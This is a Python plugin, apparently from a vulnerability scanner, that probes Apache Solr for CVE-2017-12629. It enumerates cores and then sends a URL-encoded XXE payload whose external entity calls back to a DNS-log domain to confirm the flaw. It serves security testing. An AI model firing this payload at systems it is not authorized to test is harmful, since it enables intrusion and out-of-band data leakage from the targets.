#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from lib.poc.dummy import *

"""
apache solr rce
poc from  https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE
xxe and rce, verified by xxe, and may be rce vulnerable
"""


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    url = '{}://{}:{}/solr/admin/cores?wt=json'.format(service, ip, port)
    if not conf.dnslog_enabled:
        return
    try:
        r = await http_client(ip, port).get(url, timeout=20)
        if 'status' not in r.text:
            return
        apps = r.json()['status'].keys()

        if apps:
            app = list(apps)[0]

            domain = dns_monitor(ip, port).add_checker(
                'solr-rce-xxe',
                alert_group='Apache Solr XXE/RCE',
                details='Target solr is vulnerable to XXE and RCE(CVE-2017-12629-RCE)')

            poc = '?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!' \
                  'DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22{}' \
                  '%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser'
            poc = poc.format('http://' + domain)
            url = '{}://{}:{}/solr/{}/select'.format(service, ip, port, app)

            await http_client(ip, port).get(url + poc, timeout=20)
    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8983, 'http', True, task_msg={})
    run_plugin_test(scan)
